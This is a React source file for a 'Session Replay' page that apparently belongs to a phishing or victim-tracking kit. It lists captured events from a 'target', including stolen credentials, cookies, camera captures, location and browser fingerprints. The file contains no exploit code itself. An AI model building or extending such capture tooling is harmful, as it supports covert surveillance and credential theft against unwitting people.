import { useEffect, useState, useMemo, useRef } from 'react'
import { api, EventRow, Session } from '../api/client'
import ErrorBanner from '../components/ErrorBanner'
import LoadMoreButton from '../components/LoadMoreButton'

const EVENT_ICONS: Record<string, string> = {
  page_visit: '🌐', location_granted: '📍', location_denied: '🚫',
  camera_capture: '📸', fingerprint_collected: '🔍',
  cross_session_match: '🔗', camera_granted: '📷', camera_denied: '🚫',
  storage_captured: '🍪', credentials_captured: '🔑',
}

function eventIcon(type: string) { return EVENT_ICONS[type] || '⚡' }

export default function SessionReplay() {
  const [events, setEvents] = useState<EventRow[]>([])
  const [total, setTotal] = useState(0)
  const [sessions, setSessions] = useState<Session[]>([])
  const params = new URLSearchParams(window.location.search)
  const [selectedSession, setSelectedSession] = useState(params.get('session') || 'default')
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [expandedEvent, setExpandedEvent] = useState<string | null>(null)
  const [hasMore, setHasMore] = useState(true)
  const [loadingMore, setLoadingMore] = useState(false)
  const [eventTypeFilter, setEventTypeFilter] = useState('all')
  const [search, setSearch] = useState('')
  const offsetRef = useRef(0)
  const LIMIT = 200

  const refresh = async (append = false) => {
    try {
      setError(null)
      const off = append ? offsetRef.current : 0
      const session = selectedSession === 'default' ? '' : selectedSession
      const result = await api.events(session, off, LIMIT)
      if (append) {
        setEvents(prev => [...prev, ...result.entries])
      } else {
        setEvents(result.entries)
        offsetRef.current = 0
      }
      setTotal(result.total)
      setHasMore(result.has_more)
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load') }
    finally { setLoading(false); setLoadingMore(false) }
  }

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    setEvents([])
    offsetRef.current = 0
    setExpandedEvent(null)
    setLoading(true)
    refresh()
  }, [selectedSession])

  const loadMore = () => {
    setLoadingMore(true)
    offsetRef.current += LIMIT
    refresh(true)
  }

  const eventTypes = useMemo(() => {
    const types = new Set<string>()
    for (const e of events) types.add(e.event_type)
    return Array.from(types).sort()
  }, [events])

  const typeCounts = useMemo(() => {
    const counts: Record<string, number> = {}
    for (const e of events) counts[e.event_type] = (counts[e.event_type] || 0) + 1
    return counts
  }, [events])

  const filtered = useMemo(() => {
    let f = events
    if (eventTypeFilter !== 'all') f = f.filter(e => e.event_type === eventTypeFilter)
    if (search) {
      const q = search.toLowerCase()
      f = f.filter(e =>
        e.event_type.toLowerCase().includes(q)
        || JSON.stringify(e.event_data).toLowerCase().includes(q)
      )
    }
    return f
  }, [events, eventTypeFilter, search])

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  const sessionExists = sessions.some(s => s.id === selectedSession)

  return (
    <div className="space-y-4 stagger">
      <ErrorBanner error={error} onDismiss={() => setError(null)} />

      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Session Replay</h1>
          <p className="text-sm text-tertiary mt-0.5">
            {total} events
            {filtered.length < total ? ` · ${filtered.length} shown` : ''}
          </p>
        </div>
        <div className="flex gap-2">
          <select value={selectedSession} onChange={e => setSelectedSession(e.target.value)}
            className="select-apple">
            {sessions.map(s => (
              <option key={s.id} value={s.id}>{s.name || s.id}</option>
            ))}
          </select>
          <button onClick={() => { setEvents([]); setLoading(true); refresh() }} className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      <div className="flex gap-2 flex-wrap">
        <input
          type="text"
          placeholder="Search events..."
          value={search}
          onChange={e => setSearch(e.target.value)}
          className="input-apple flex-1 min-w-[200px]"
        />
        <select value={eventTypeFilter} onChange={e => setEventTypeFilter(e.target.value)}
          className="select-apple min-w-[180px]">
          <option value="all">All types ({events.length})</option>
          {eventTypes.map(t => (
            <option key={t} value={t}>{t.replace(/_/g, ' ')} ({typeCounts[t]})</option>
          ))}
        </select>
      </div>

      {!sessionExists && selectedSession !== 'default' && (
        <div className="content-card">
          <p className="text-sm text-tertiary">Session "{selectedSession.substring(0, 20)}" not found. Select an existing session from the dropdown.</p>
        </div>
      )}

      {filtered.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon !text-4xl">⚡</div>
          <h3>{search || eventTypeFilter !== 'all' ? 'No matching events' : 'No events yet'}</h3>
          <p>{search || eventTypeFilter !== 'all' ? 'Try changing the filter or search term' : 'Events appear as the target interacts with the page'}</p>
        </div>
      ) : (
        <div className="content-card-lg !p-0 overflow-hidden">
          <div className="max-h-[70vh] overflow-y-auto">
            {filtered.map((e, i) => {
              const isExpanded = expandedEvent === e.id
              const dataStr = e.event_data
                ? (typeof e.event_data === 'object' ? JSON.stringify(e.event_data, null, 2) : e.event_data)
                : null
              const isLong = dataStr && dataStr.length > 80
              return (
                <div key={e.id}
                  className="flex items-start gap-3 px-4 py-2.5 border-b border-subtle text-sm animate-fade-in hover:bg-white/[0.02] cursor-pointer transition-colors"
                  style={{ animationDelay: `${Math.min(i * 0.015, 0.5)}s` }}
                  onClick={() => isLong && setExpandedEvent(isExpanded ? null : e.id)}>
                  <span className="text-lg select-none mt-0.5">{eventIcon(e.event_type)}</span>
                  <div className="flex-1 min-w-0">
                    <span className="text-secondary font-medium">{e.event_type.replace(/_/g, ' ')}</span>
                    {dataStr && (
                      <pre className="text-xs text-tertiary mono mt-1 whitespace-pre-wrap break-all font-sans">
                        {isExpanded ? dataStr : dataStr.substring(0, 80)}{isLong && !isExpanded ? '…' : ''}
                      </pre>
                    )}
                  </div>
                  <span className="text-xs text-tertiary mono shrink-0 mt-0.5">{new Date(e.created_at * 1000).toLocaleTimeString()}</span>
                </div>
              )
            })}
            <LoadMoreButton hasMore={hasMore} loading={loadingMore} onLoad={loadMore} />
          </div>
        </div>
      )}
    </div>
  )
}
